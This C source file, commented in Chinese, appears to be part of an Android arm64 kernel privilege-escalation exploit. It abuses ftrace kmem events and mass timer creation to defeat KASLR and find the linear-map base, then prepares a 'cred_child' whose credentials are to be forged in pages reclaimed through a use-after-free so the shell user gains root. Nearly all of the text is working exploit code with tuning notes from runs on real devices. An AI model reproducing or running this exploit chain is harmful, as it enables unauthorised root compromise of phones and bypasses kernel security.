/* ---- 反推 slide 候选：完全绕开记录布局 --------------------------------
 * 日志里出现「req=0x8 / alloc=0x100」这种值，说明 buf+i 没对准记录头，
 * 按固定偏移读字段是不可靠的。但 call_site 本身有个强特征：它是内核
 * 地址，高 16 位必为 0xffff，且等于「画像链接地址 + slide」。
 *
 * 于是不做结构体解析，只扫所有 8 字节窗口：凡是高 16 位为 0xffff 的值，
 * 减去画像里的链接期地址；差值为 2 MiB 对齐且落在内核镜像随机窗口
 * （公式窗口）内的算一个候选。
 * 真实的 call_site 会在窗口里出现约 2048 次，错位读出的噪声不会。
 * slide=0 时差值就是 0，所以用 >= 而不是 >，否则正好漏掉这种情况。 */
typedef struct { uint64_t d; unsigned c; } SlideCand;

static void dump_delta_hist(const char *tag, uint64_t *v, size_t n)
{
    SlideCand top[6];
    int ntop = 0;
    size_t i = 0;

    memset(top, 0, sizeof(top));
    if (!n) {
        LOG_WARN("[sites] 相对 %s 没有 2MiB 对齐的候选（窗口内可能根本没有该事件）", tag);
        return;
    }
    qsort(v, n, sizeof(*v), cmp_u64);
    while (i < n) {
        size_t j = i + 1;
        while (j < n && v[j] == v[i]) j++;
        unsigned c = (unsigned)(j - i);
        if (ntop < 6) {
            top[ntop].d = v[i]; top[ntop].c = c; ntop++;
        } else {
            int m = 0;
            for (int k = 1; k < 6; k++) if (top[k].c < top[m].c) m = k;
            if (top[m].c < c) { top[m].d = v[i]; top[m].c = c; }
        }
        i = j;
    }
    for (int a = 0; a < ntop; a++)
        for (int b = a + 1; b < ntop; b++)
            if (top[b].c > top[a].c) {
                SlideCand t = top[a]; top[a] = top[b]; top[b] = t;
            }

    LOG_WARN("[sites] 相对 %s 的 slide 候选（%zu 次命中）：", tag, n);
    for (int k = 0; k < ntop; k++) {
        if (top[k].c < 4) break;
        LOG_WARN("[sites]   slide=%#" PRIx64 "  票数=%u%s", top[k].d, top[k].c,
                 top[k].d == g_slide ? "   <= 当前 g_slide" : "");
    }
}

/* 绝对众数诊断：完全不看画像，只统计 raw 里出现次数最多的内核地址。
 *
 * 为什么需要它：dump_slide_candidates() 的前提是「画像 timer_link 的低
 * 21 位等于真机 call_site 的低 21 位」（slide 是 2 MiB 对齐，低 21 位
 * 不变）。画像一旦错位，候选表就永远是空的，日志只会说「没有候选」，
 * 看不出到底是「没记录」还是「画像不对」。
 *
 * 这里把真实的 top 值原样打出来：2048 条 k_itimer 记录的 call_site 会
 * 以 2048 票登顶，一眼就能看出它的低 21 位和画像差多少。 */
static void dump_top_kernel_values(const uint8_t *buf, size_t used)
{
    enum { SLOTS = 64 };
    static struct { uint64_t v; unsigned c; } t[SLOTS];
    int n = 0;

    if (!buf || used < 64) return;
    memset(t, 0, sizeof(t));
    for (size_t i = 0; i + 8 <= used; i++) {
        uint64_t x;
        int k;
        memcpy(&x, buf + i, 8);
        if ((x >> 48) != 0xffff || x < UINT64_C(0xffffff8000000000))
            continue;
        for (k = 0; k < n; k++)
            if (t[k].v == x) { t[k].c++; break; }
        if (k < n) continue;
        if (n < SLOTS) {
            t[n].v = x; t[n].c = 1; n++;
        } else {
            /* 表满：淘汰票数最少的那个槽（只在它比 1 票还多时才值得，
             * 否则直接丢弃这个新值——噪声本来就只有 1 票） */
            int m = 0;
            for (k = 1; k < SLOTS; k++) if (t[k].c < t[m].c) m = k;
            if (t[m].c == 1) { t[m].v = x; t[m].c = 1; }
        }
    }
    for (int a = 0; a < n; a++)
        for (int b = a + 1; b < n; b++)
            if (t[b].c > t[a].c) { uint64_t v = t[a].v; unsigned c = t[a].c;
                                   t[a].v = t[b].v; t[a].c = t[b].c;
                                   t[b].v = v; t[b].c = c; }
    LOG_WARN("[top] raw 里出现最多的内核地址（%zu 字节，绝对众数，不看画像）：", used);
    for (int k = 0; k < n && k < 8; k++) {
        uint64_t v = t[k].v, d = 0;
        int neg = 0;
        if (t[k].c < 4) break;
        if (v >= P.timer_link) d = v - P.timer_link;
        else { d = P.timer_link - v; neg = 1; }
        LOG_WARN("[top] %#018" PRIx64 " x%u  低21=%#06" PRIx64
                 "（画像=%#06" PRIx64 "）  差=%s%#" PRIx64 "%s",
                 v, t[k].c, v & 0x1FFFFFULL, P.timer_link & 0x1FFFFFULL,
                 neg ? "-" : "", d, (d & 0x1FFFFF) ? "  (未 2MiB 对齐)" : "");
    }
}

static void dump_slide_candidates(const uint8_t *buf, size_t used)
{
    enum { CAP = 16384 };
    static uint64_t dt[CAP], dc[CAP];
    size_t nt = 0, nc = 0, nout = 0, i;
    uint64_t out_lo = 0, out_hi = 0;

    if (!buf || used < 64) return;
    for (i = 0; i + 8 <= used; i++) {
        uint64_t x, d;
        memcpy(&x, buf + i, 8);
        if ((x >> 48) != 0xffff) continue;
        if (P.timer_link && x >= P.timer_link) {
            d = x - P.timer_link;
            if (d & (GK_SZ_2M - 1)) continue;
            if (slide_in_window(d)) {
                if (nt < CAP) dt[nt++] = d;
            } else if (d < (UINT64_C(1) << 44)) {
                /* 窗口外的 2 MiB 对齐候选单独计数：如果它们才是热点，
                 * 说明这个 site 落在 vmemmap / 模块区，不是 .text 里的
                 * call_site，画像或事件本身有问题。 */
                nout++;
                if (!out_lo || d < out_lo) out_lo = d;
                if (d > out_hi) out_hi = d;
            }
        }
        if (P.cred_link && x >= P.cred_link) {
            d = x - P.cred_link;
            if (slide_in_window(d) && nc < CAP) dc[nc++] = d;
        }
    }
    dump_delta_hist("timer_link", dt, nt);
    dump_delta_hist("cred_link", dc, nc);
    if (nout)
        LOG_WARN("[sites] 窗口外另有 %zu 个 2MiB 对齐候选，范围 [%#" PRIx64
                 ", %#" PRIx64 "]；公式窗口是 [%#" PRIx64 ", %#" PRIx64
                 "]（VA_BITS=%" PRIu64 "）。落在 vmemmap 一带说明这些值"
                 "不是 .text 里的 call_site", nout, out_lo, out_hi,
                 g_slide_min, g_slide_max, g_va_bits);
}

/* -vv：raw 前 256 字节原样抄出来。ring buffer 每页有页头，真正的事件从
 * 某个偏移才开始；盲扫时看不到这段就没法判断布局差了几个字节。 */
static void dump_raw_hex(const uint8_t *buf, size_t used)
{
    size_t n = used < 256 ? used : 256;
    if (g_verbose < 2) return;
    for (size_t i = 0; i < n; i += 16) {
        char line[128];
        int p = snprintf(line, sizeof(line), "%04zx:", i);
        for (size_t j = 0; j < 16 && i + j < n; j++)
            p += snprintf(line + p, sizeof(line) - (size_t)p, " %02x", buf[i + j]);
        LOG_V2("%s", line);
    }
}

/* timer_probe：造一批 CLOCK_THREAD_CPUTIME_ID timer，逼 do_timer_create()
 * 从 posix_timers_cache 连续分配 k_itimer。原项目：timer_probe.c。
 *
 * 注意这个 ROM 的 enable 是靠 rss_stat/trigger 借道打开的（直接写
 * events/kmem/kmem_cache_alloc/enable 返回 EACCES）。trigger 只在
 * rss_stat **命中** 的那一刻执行 enable_event，所以窗口开始前必须
 * kick 到 enable 真正落地（见 wait_event_enabled），窗口内则一次都不
 * 能 kick —— 见下方注释。 */
static int timer_probe(int n, int hold_sec)
{
    struct sigevent ev;
    int made = 0;
    timer_t *ids;

    /* 记录容量自适应：trace_pipe_raw 只保留 ring buffer 里的最新内容，
     * buffer 越小、越早的记录被覆盖得越多。按 48 字节/条 估容量，留
     * 1/4 余量给页头与零星系统分配。 */
    if (g_buffer_kb > 0) {
        int capacity = g_buffer_kb * 1024 / 48;
        int fit = capacity / 4 * 3;
        if (fit < 64) fit = 64;
        if (n > fit) {
            LOG_V1("[timer_probe] buffer %d KB/核 约容 %d 条，n 从 %d 收到 %d",
                   g_buffer_kb, capacity, n, fit);
            n = fit;
        }
    }
    ids = calloc((size_t)(n > 0 ? n : 1), sizeof(*ids));
    if (!ids) return -1;
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    if (pin_cpu(0)) {
        cpu_set_t allowed;
        char mask[128] = "";
        size_t p = 0;
        CPU_ZERO(&allowed);
        if (!sched_getaffinity(0, sizeof(allowed), &allowed))
            for (int c = 0; c < CPU_SETSIZE && p + 8 < sizeof(mask); c++)
                if (CPU_ISSET(c, &allowed))
                    p += (size_t)snprintf(mask + p, sizeof(mask) - p, "%d,", c);
        LOG_WARN("[timer_probe] pin_cpu(0) 失败 errno=%d，允许集合=%s"
                 "（记录分散到多核，已按全 CPU 采集，不影响样本量）",
                 errno, mask[0] ? mask : "?");
        g_timer_pin_failed = 1;
    } else {
        LOG_V1("[timer_probe] pin_cpu(0) 成功");
        g_timer_pin_failed = 0;
    }
    for (int i = 0; i < n; i++) {
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, &ev, &ids[i])) break;
        made++;
        /* 窗口内不再 kick / stir：事件在 arm 阶段就应该被 stir 到
         * hard-enabled（enable 回读 "1" 而不是 "1*"），之后每次
         * timer_create 都会自然进环。窗口内制造 rss 事件只会往环里
         * 灌噪声，覆盖掉刚写进去的 k_itimer 记录。 */
    }
    /* hold 期间纯等待，同样不 kick：事件已经 enable，soft-disable 只有
     * disarm_all() 的 disable_event trigger 才会触发。 */
    for (int s = 0; s < hold_sec * 10; s++) {
        struct timespec nap = { .tv_sec = 0, .tv_nsec = 100000000L };
        nanosleep(&nap, NULL);
    }
    for (int i = 0; i < made; i++) timer_delete(ids[i]);
    free(ids);
    STAGE_LOG("made=%d", made);
    return made;
}

/* ==========================================================================
 * [1] 校准 A —— KASLR slide
 * 原理：所有 k_itimer 分配记录的 call_site 都是 do_timer_create+0xA8 的
 * 运行时地址 = timer_link + slide。取众数再减去静态 timer_link 即得 slide。
 * 原项目：calib.c:calib_a_main + calib_core.c:calib_scan_kitimer/top_values
 * ========================================================================== */
static int stage_a_calibrate_slide(void)
{
    uint8_t *buf = raw_buf(4U << 20);
    uint64_t *sites = NULL;
    size_t used, nsites = 0, cap = 4096;
    uint64_t best_site = 0;
    int best_count = 0;
    struct cap_ctx cap_ctx;
    if (!buf) return -1;

    disarm_all();
    /* 采集顺序（对齐上游 calib.c:calib_a_main）：
     *   关 tracing -> 清 trace -> 设 buffer -> arm（stir 跨 64 页阈值，
     *   把 enable_event 真正推到 hard-enabled）-> 清掉 arm 噪声
     *   -> 起 reader -> 开 tracing -> probe 子进程边写边读。
     *
     * 两个关键点：
     *   ① enable_event 的执行不依赖 tracing_on，所以在 tracing_on=0 时
     *      就能把事件 stir 成 enable=1；开 tracing 之后每条记录都会进环。
     *   ② reader 必须在 tracing_on=1 之前起来。trace_pipe_raw 是消费式
     *      pipe，事后才 open 会立刻 EOF —— 这就是 raw=0 的直接原因。 */
    write_file(TRACE "/tracing_on", "0\n");
    write_file_mode(TRACE "/trace", "", O_TRUNC);
    /* disarm_all() 把 buffer 压到 7 KB/核，这里必须设回去并回读真实值 */
    set_buffer_kb(16384);
    if (arm_kmem_cache_alloc()) return -1;   /* arm_kmem_event 已打印具体原因 */
    if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n"))
        LOG_WARN("[arm] rss_stat/enable 写入失败 errno=%d (%s)：宿主事件起不来，"
                 "trigger 永远不会命中", errno, strerror(errno));
    /* arm 已经 stir 过一轮；这里再确认一次，仍不是 "1" 就先说清楚，
     * 免得又跑出一份 raw=0 的日志让人猜。 */
    if (wait_event_enabled("kmem_cache_alloc", 4))
        LOG_WARN("[arm] kmem_cache_alloc 回读仍不是 1（soft-disabled）："
                 "本轮窗口大概率零记录");
    /* arm/stir 阶段的记录全是噪声，进窗口前清掉 */
    write_file_mode(TRACE "/trace", "", O_TRUNC);
    if (cap_start(&cap_ctx, buf, 4U << 20, online_cpus())) {
        disarm_all();
        return -1;
    }
    if (write_file(TRACE "/tracing_on", "1\n")) {
        cap_finish(&cap_ctx);
        disarm_all();
        return -1;
    }
    LOG_V1("[probe] tracing_on=1 kmem_enable=%s rss_stat_enable=%s",
           event_state("kmem_cache_alloc") == 1 ? "1" : "0",
           event_state("rss_stat") == 1 ? "1" : "0");

    /* probe 放子进程，父进程全程 poll 排空 pipe —— reader 边写边读，
     * 记录不用指望 ring buffer 留到事后（这正是 raw=0 的直接原因）。
     * hold 2 秒是安全的：reader 一直在消费，环不会覆盖。 */
    {
        pid_t pid = fork();
        if (pid == 0) {
            _exit(timer_probe(2048, 2) == 0 ? 0 : 2);
        }
        if (pid > 0) {
            int st = 0;
            cap_poll(&cap_ctx, mono_ms() + 7000);
            while (waitpid(pid, &st, 0) < 0 && errno == EINTR) { }
            /* 兜底：若 arm 没把事件推到 hard-enabled，窗口末尾再跨一次阈值 */
            if (event_state("kmem_cache_alloc") != 1) {
                LOG_WARN("[window] 事件仍是 soft，窗口末尾补 stir 4 轮");
                stir_rss(4);
            }
            usleep(150000);
        } else {
            LOG_WARN("[probe] fork 失败，probe 在本进程内跑（无并发采集）");
            timer_probe(2048, 2);
        }
    }

    write_file(TRACE "/tracing_on", "0\n");
    write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
    cap_poll(&cap_ctx, mono_ms() + 300);
    cap_finish(&cap_ctx);
    used = cap_ctx.len;
    STAGE_LOG("calib_a 采集完成 raw=%zu 字节", used);
    if (!used) {
        STAGE_LOG("窗口内零记录：kmem_enable=%s rss_stat=%s —— 事件没真正启用或 "
                  "reader 没读到；看下面 [evidence]/[top]",
                  event_state("kmem_cache_alloc") == 1 ? "1" : "0/1*",
                  event_state("rss_stat") == 1 ? "1" : "0/1*");
        snapshot_trace_evidence();
        verbose_event_state("kmem_cache_alloc");
        verbose_event_state("rss_stat");
        dump_trace_evidence();
        return -1;
    }

    sites = malloc(cap * sizeof(*sites));
    if (!sites) return -1;
    size_t n_scan = 0, n_drop_size = 0, n_drop_ptr = 0, n_drop_site = 0;
    /* 尺寸判定必须是 req == alloc == 候选尺寸（严格相等）。
     *
     * 之前写成「任一命中」，理由是「真机 alloc=0x140，被
     * SLAB_HWCACHE_ALIGN 放大」。那条 0x140 其实是错位读出的假值：
     * posix_timers_cache 的 obj_size 就是 264，bytes_req 与 bytes_alloc
     * 都等于 0x108。放宽成「任一」之后，1 字节步进扫描里大量错位窗口
     * 被误收 —— 上一轮「命中 call_site=73、众数差 812 GiB」就是这么来的。
     * 这里改回上游 calib_core.c:calib_scan_kitimer 的严格相等，并把
     * 上游同款的 4 个候选尺寸一起试。 */
    uint64_t sizes[4];
    size_t n_sizes = 0;
    sizes[n_sizes++] = P.kitimer_size;
    if (P.kitimer_size != 0x100) sizes[n_sizes++] = 0x100;
    if (P.kitimer_size != 0x110) sizes[n_sizes++] = 0x110;
    if (P.kitimer_size != 0x118) sizes[n_sizes++] = 0x118;
    for (size_t i = 24; i + 16 < used; i++) {
        uint64_t req = rd_u64(buf + i);
        uint64_t alloc = rd_u64(buf + i + 8);
        uint64_t ptr = rd_u64(buf + i - 8);
        uint64_t site = rd_u64(buf + i - 16);
        int match = 0;
        n_scan++;
        for (size_t s = 0; s < n_sizes; s++)
            if (req == sizes[s] && alloc == sizes[s]) { match = 1; break; }
        if (!match) { n_drop_size++; continue; }
        if ((ptr >> 48) != 0xffff || (ptr & 7)) { n_drop_ptr++; continue; }
        if ((site >> 48) != 0xffff) { n_drop_site++; continue; }
        if (nsites == cap) {
            uint64_t *p = realloc(sites, cap * 2 * sizeof(*sites));
            if (!p) break;
            sites = p; cap *= 2;
        }
        sites[nsites++] = site;
    }
    LOG_V1("[calib_a] raw 字节=%zu 扫描偏移=%zu 命中 call_site=%zu"
           " 丢弃(尺寸=%zu/指针=%zu/调用点=%zu) sizes=[%#" PRIx64 ",%#" PRIx64
           ",%#" PRIx64 ",%#" PRIx64 "]",
           used, n_scan, nsites, n_drop_size, n_drop_ptr, n_drop_site,
           sizes[0], n_sizes > 1 ? sizes[1] : 0,
           n_sizes > 2 ? sizes[2] : 0, n_sizes > 3 ? sizes[3] : 0);
    if (!nsites) {
        STAGE_LOG("未找到 k_itimer 记录");
        dump_raw_hex(buf, used);
        dump_kmem_size_hist(buf, used);
        dump_top_kernel_values(buf, used);
        dump_slide_candidates(buf, used);
        dump_trace_evidence();
        free(sites);
        return -1;
    }
    qsort(sites, nsites, sizeof(*sites), cmp_u64);
    for (size_t i = 0; i < nsites; ) {
        size_t j = i + 1;
        while (j < nsites && sites[j] == sites[i]) j++;
        if ((int)(j - i) > best_count) { best_count = (int)(j - i); best_site = sites[i]; }
        i = j;
    }
    free(sites);
    LOG_V1("[calib_a] 众数 site=%#" PRIx64 " count=%d timer_link=%#" PRIx64
           " 差值=%s%#" PRIx64, best_site, best_count, P.timer_link,
           best_site >= P.timer_link ? "" : "-",
           best_site >= P.timer_link ? best_site - P.timer_link
                                     : P.timer_link - best_site);
    if (best_site < P.timer_link) {
        STAGE_LOG("call_site 众数异常（低于画像链接地址）");
        dump_top_kernel_values(buf, used);
        dump_trace_evidence();
        return -1;
    }
    g_slide = best_site - P.timer_link;
    /* 2 MiB 对齐是 arm64 KASLR 的硬约束（MIN_KIMG_ALIGN）。以前这里只打
     * 一行警告就继续用，结果把 0x1c2bc9d35 这种噪声当 slide 喂给校准 B，
     * 后面全链失败还看不出原因。现在直接判失败。 */
    if (g_slide & (GK_SZ_2M - 1)) {
        STAGE_LOG("slide 未按 2MiB 对齐（%#" PRIx64 "，count=%d），判为噪声候选，"
                  "本轮放弃", g_slide, best_count);
        dump_top_kernel_values(buf, used);
        dump_slide_candidates(buf, used);
        dump_kmem_size_hist(buf, used);
        dump_trace_evidence();
        return -1;
    }
    /* 公式窗口校验：offset = BIT(VA_BITS_MIN-3) + (seed & mask)，39 位 VA
     * 只能落在 [64 GiB, 192 GiB]。窗口外的高票地址通常来自 vmemmap
     * （0xfffffffdxxxxxxxx），不是 do_timer_create 的 call_site —— 写原语
     * 拿它算目标地址会直接踩坏内核，宁可在这里判死。 */
    if (!slide_in_window(g_slide)) {
        STAGE_LOG("slide 不在 KASLR 公式窗口：%#" PRIx64 "（窗口 [%#" PRIx64
                  ", %#" PRIx64 "]，VA_BITS=%" PRIu64 "，2MiB 步进）",
                  g_slide, g_slide_min, g_slide_max, g_va_bits);
        STAGE_LOG("判别：看下面 [top] 的最高票地址 —— 若它落在 0xfffffffd…"
                  "（vmemmap）或票数个位数，就是假 call_site，换画像重采；"
                  "若确认本机厂商改过 KASLR 公式，用 --max-slide %#" PRIx64
                  " 显式放宽（会同时放开下界）", g_slide);
        dump_top_kernel_values(buf, used);
        dump_slide_candidates(buf, used);
        dump_trace_evidence();
        return -1;
    }
    /* 票数只做警告、不再判死。上游 calib_a 的判据是 count>=64 就算稳，
     * 实测 202 票（2048 次 create，reader 只来得及收 10%）也能一次算对。
     * 之前用「count*16 < made」当硬门槛，把这类正常结果直接扔掉。 */
    if (best_count < 64) {
        LOG_WARN("[calib_a] 众数票数只有 %d（<64）：样本偏少，结果可能不稳",
                 best_count);
        dump_kmem_size_hist(buf, used);
    }
    STAGE_LOG("site=%#" PRIx64 " count=%d slide=%#" PRIx64 " _text=%#" PRIx64,
              best_site, best_count, g_slide, UINT64_C(0xffffffc008000000) + g_slide);
    printf("C98260_SLIDE=0x%" PRIx64 "\n", g_slide);
    disarm_kmem_cache_alloc();
    return 0;
}

/* ==========================================================================
 * [2] 校准 B —— page_offset（线性映射基址）
 * 原理：同一窗口里同时采
 *   (a) mm_page_alloc(order=1) 的物理 PFN 集合（text trace，未哈希）
 *   (b) k_itimer 的虚拟地址集合（raw trace，按 call_site=timer_link+slide 过滤）
 * 把 (b) 去重成 8KB 对齐的 slab 页，扫描候选基址 L：
 *   正确的 L 会让 (ptr - L) >> 12 大量命中 (a)。命中最多者即 PAGE_OFFSET。
 * 原项目：calib.c:calib_b_main + calib_core.c:calib_solve_lmap/pages_from_ptrs
 * ========================================================================== */
#define SCAN_START UINT64_C(0xffffff7e00000000)
#define LMAP_END   UINT64_C(0xffffff8c00000000)
#define SCAN_STEP  UINT64_C(0x200000)

/* 从单个 text trace 文件提取 mm_page_alloc(order=1) 的物理 PFN。 */
static void scan_order1_file(const char *path, uint64_t **pv, size_t *pn,
                             size_t *pcap, size_t *n_alloc_lines,
                             size_t *n_order1, size_t *n_files)
{
    char line[8192];
    FILE *f = fopen(path, "r");
    if (!f) {
        LOG_V2("[trace] 打不开 %s errno=%d (%s)", path, errno, strerror(errno));
        return;
    }
    LOG_V2("[trace] 读取 text trace：%s", path);
    (*n_files)++;
    while (fgets(line, sizeof(line), f)) {
        const char *p;
        uint64_t pfn;
        if (!strstr(line, "mm_page_alloc")) continue;
        (*n_alloc_lines)++;
        p = strstr(line, "order=1");
        if (!p) continue;
        /* 排除 order=10/11/12.. 的误匹配（对齐原项目 calib.c:519） */
        if (p[7] >= '0' && p[7] <= '9') continue;
        (*n_order1)++;
        pfn = parse_pfn(line);
        if (pfn == UINT64_MAX) continue;
        if (*pn == *pcap) {
            uint64_t *q = realloc(*pv, *pcap * 2 * sizeof(**pv));
            if (!q) break;
            *pv = q; *pcap *= 2;
        }
        if (*pn < 3) LOG_V3("[trace] order=1 样本：%.160s", line);
        (*pv)[(*pn)++] = pfn;
    }
    fclose(f);
}

/* 校准 B 的 (a) 侧样本：order=1 页分配的物理 PFN 集合。
 * 原项目 calib.c:collect_order1_pfns 只读全局 TRACE "/trace"；
 * 本文件早期版本误读 per_cpu/cpuN/trace——该视图在部分 ROM 上为空，
 * 于是 order1_pfns=0、扫描循环没有样本、校准 B 必然降级为兜底值。
 * 这里两种都采并输出诊断计数，真机一眼即可定位断点在哪一层。 */
static uint64_t *collect_order1_pfns(size_t *out_n)
{
    size_t cap = 4096, n = 0;
    size_t n_alloc = 0, n_order1 = 0, n_files = 0;
    uint64_t *v = malloc(cap * sizeof(*v));
    char path[128];
    if (!v) return NULL;

    /* 全局 trace 优先：这是原项目校准 B 能成功的数据来源 */
    scan_order1_file(TRACE "/trace", &v, &n, &cap,
                     &n_alloc, &n_order1, &n_files);
    /* per_cpu 补充：某些 ROM 的全局 /trace 会被截断或为空 */
    for (int cpu = 0; cpu < cpu_count(); cpu++) {
        snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
        scan_order1_file(path, &v, &n, &cap,
                         &n_alloc, &n_order1, &n_files);
    }
    qsort(v, n, sizeof(*v), cmp_u64);
    /* 全局与 per_cpu 内容重叠，去重避免命中计数虚高 */
    if (n) {
        size_t w = 1;
        for (size_t i = 1; i < n; i++)
            if (v[i] != v[w - 1]) v[w++] = v[i];
        n = w;
    }
    STAGE_LOG("text trace: 可读文件=%zu mm_page_alloc 行=%zu"
              " order=1 行=%zu 有效 PFN=%zu（去重后）",
              n_files, n_alloc, n_order1, n);
    if (!n)
        LOG_WARN("未取到任何 order=1 PFN；请确认 "
                 "events/kmem/mm_page_alloc/enable 确实为 1，"
                 "且内核 text trace 会打印 pfn= 字段");
    *out_n = n;
    return v;
}

static int stage_b_calibrate_lmap(void)
{
    uint8_t *buf = raw_buf(8U << 20);
    uint64_t *ptrs = NULL, *pages = NULL, *pfns;
    size_t used, n_ptrs = 0, n_pages = 0, n_pfns = 0, cap = 4096;
    uint64_t site_link = slide_addr(P.timer_link);
    uint64_t best_base = 0;
    uint64_t best_score = 0;
    if (!buf) return -1;

    disarm_all();
    write_file(TRACE "/buffer_size_kb", "65536\n");
    if (arm_kmem_event("kmem_cache_alloc")) return -1;
    /* 关键修复：mm_page_alloc 必须真正启用；旧版裸 write_file 且不检查
     * 返回值，事件没起来时 text trace 一行都没有，order1_pfns 必然为 0。 */
    if (arm_kmem_event("mm_page_alloc")) return -1;
    /* rss_stat 在整个 timer_probe 窗口保持开启，让 trigger 回退持续生效 */
    write_file(TRACE "/events/kmem/rss_stat/enable", "1\n");
    kick_rss();
    write_file_mode(TRACE "/trace", "", O_TRUNC);
    if (trace_off_on()) return -1;

    timer_probe(4096, 1);

    write_file(TRACE "/tracing_on", "0\n");
    write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
    pfns = collect_order1_pfns(&n_pfns);

    /* 兜底：若 text trace 仍无 order=1 样本，强制挂 trigger 再采一轮。
     * 此时 raw trace 还没被 capture_raw_cpu 消费，重跑 probe 不会丢样本。 */
    if (!n_pfns) {
        LOG_WARN("首轮无 order=1 样本，强制 trigger 重新启用 mm_page_alloc 并重试一次");
        trigger_cmd("enable_event:kmem:mm_page_alloc\n");
        write_file(TRACE "/events/kmem/rss_stat/enable", "1\n");
        kick_rss();
        write_file_mode(TRACE "/trace", "", O_TRUNC);
        if (trace_off_on()) return -1;
        timer_probe(4096, 1);
        write_file(TRACE "/tracing_on", "0\n");
        write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
        free(pfns);
        pfns = collect_order1_pfns(&n_pfns);
    }

    /* raw trace 来自所有 CPU，probe 可能跑在任意 CPU 上 */
    ptrs = malloc(cap * sizeof(*ptrs));
    if (!ptrs || !pfns) { free(ptrs); free(pfns); return -1; }
    for (int cpu = 0; cpu < cpu_count(); cpu++) {
        used = capture_raw_cpu(cpu, buf, 8U << 20);
        for (size_t i = 24; i + 16 < used; i++) {
            uint64_t req = rd_u64(buf + i);
            uint64_t ptr = rd_u64(buf + i - 8);
            uint64_t site = rd_u64(buf + i - 16);
            if (req != P.kitimer_size) continue;
            if (site != site_link) continue;
            if ((ptr >> 48) != 0xffff || (ptr & 7)) continue;
            if (n_ptrs == cap) {
                uint64_t *p = realloc(ptrs, cap * 2 * sizeof(*ptrs));
                if (!p) break;
                ptrs = p; cap *= 2;
            }
            ptrs[n_ptrs++] = ptr;
        }
    }
    /* 去重成 8KB 对齐的 slab 页（order-1 = 2 页） */
    pages = malloc((n_ptrs ? n_ptrs : 1) * sizeof(*pages));
    if (pages) {
        for (size_t i = 0; i < n_ptrs; i++) pages[i] = ptrs[i] & ~UINT64_C(0x1fff);
        qsort(pages, n_ptrs, sizeof(*pages), cmp_u64);
        for (size_t i = 0; i < n_ptrs; i++)
            if (n_pages == 0 || pages[n_pages - 1] != pages[i])
                pages[n_pages++] = pages[i];
    }
    STAGE_LOG("k_itimer=%zu slab_pages=%zu order1_pfns=%zu site=%#" PRIx64,
              n_ptrs, n_pages, n_pfns, site_link);
    if (g_verbose >= 2) {
        for (size_t i = 0; i < n_pfns && i < 8; i++)
            LOG_V2("[calib_b] pfn[%zu]=%#" PRIx64, i, pfns[i]);
        for (size_t i = 0; i < n_pages && i < 8; i++)
            LOG_V2("[calib_b] slab_page[%zu]=%#" PRIx64, i, pages[i]);
    }

    if (n_pages && n_pfns) {
        for (uint64_t L = SCAN_START; L < LMAP_END; L += SCAN_STEP) {
            uint64_t score = 0;
            for (size_t i = 0; i < n_pages; i++) {
                uint64_t pfn = (pages[i] - L) >> 12;
                if (bsearch(&pfn, pfns, n_pfns, sizeof(*pfns), cmp_u64)) score++;
            }
            if (score > best_score) { best_score = score; best_base = L; }
        }
    }
    LOG_V1("[calib_b] 扫描 %#" PRIx64 "..%#" PRIx64 " 步长=%#" PRIx64
           " 候选=%" PRIu64 " 最佳 base=%#" PRIx64 " score=%" PRIu64 "/%zu",
           (uint64_t)SCAN_START, (uint64_t)LMAP_END, (uint64_t)SCAN_STEP,
           (uint64_t)((LMAP_END - SCAN_START) / SCAN_STEP),
           best_base, best_score, n_pages);
    if (best_score) {
        P.page_offset = best_base;
        STAGE_LOG("page_offset=%#" PRIx64 " score=%" PRIu64 "/%zu",
                  best_base, best_score, n_pages);
        printf("C98260_PAGE_OFFSET=0x%" PRIx64 "\n", best_base);
    } else {
        STAGE_LOG("无基址命中，退回画像默认值 %#" PRIx64, P.page_offset);
    }
    free(ptrs); free(pages); free(pfns);
    disarm_all();
    return best_score ? 0 : -1;   /* 原项目此处降级为 warning，不中止 */
}

/* ==========================================================================
 * [3] 地址泄漏 + cred_child
 * cred_child 是整条链里最关键的角色：它 fork 出来后立刻 mlockall() 锁住
 * 全部地址空间，后续伪造 cred 就放在它借来的、被 UAF 回收的页里。
 * 原项目：uaf_plant.c:leak_task / cred_child / ask_child / log_proc_uid
 * ========================================================================== */
static int  g_wake[2]   = { -1, -1 };
static int  g_report[2] = { -1, -1 };
static pid_t g_cred_child_pid = -1;
static volatile sig_atomic_t g_daemon_mode;
static int g_rootd_forked;

/* 提权后动作的前置声明（stage_h 里实现） */
static void run_rootd(void);

/* capset 是为触发 prepare_creds() 选的：参数合法时它无条件在 cred_jar
 * 上分配一个进程独占的新 cred，且不需要任何特权（把 caps 设成 0/0/0 是
 * 合法子集）。这一次分配就是 ftrace 里要抓的目标。 */
#define CRED_CAPSET_CMD 0xCC
#define CAP_VERSION_3   0x20080522u
struct cred_cap_hdr { uint32_t version; int32_t pid; };
struct cred_cap_data { uint32_t effective, permitted, inheritable; };

static void cred_child(void)
{
    sigset_t block;
    setpgid(0, 0);
    /* trace 只读 cpu0，capset 必须在这个 CPU 上发生。 */
    if (pin_cpu(0))
        STAGE_LOG("警告：pin_cpu 失败 errno=%d", errno);
    sigfillset(&block);
    sigprocmask(SIG_BLOCK, &block, NULL);
    if (g_wake[1] >= 0) close(g_wake[1]);
    if (g_report[0] >= 0) close(g_report[0]);
    g_wake[1] = g_report[0] = -1;

    /* 不锁页的话，回填页可能被再次回收，cred 读回来还是原来的 uid=2000。
     * Android 把 RLIMIT_MEMLOCK 的硬限压在 64 KB，普通 app 提不上去
     * （EPERM），mlockall 就必然 ENOMEM。这只影响 daemon 阶段的保险：
     * 回填页真正的引用在 socket 的 skb 上，socket 不关页就不会回收，
     * 所以锁页失败不阻断流程，也不影响 cred 地址探测。 */
    {
        struct rlimit rl = { RLIM_INFINITY, RLIM_INFINITY };
        if (setrlimit(RLIMIT_MEMLOCK, &rl))
            LOG_V2("[cred_child] RLIMIT_MEMLOCK 无法提高 errno=%d（Android 硬限）",
                   errno);
    }
    if (mlockall(MCL_CURRENT | MCL_FUTURE))
        LOG_V2("[cred_child] mlockall 失败 errno=%d（靠 socket 引用钉页）", errno);

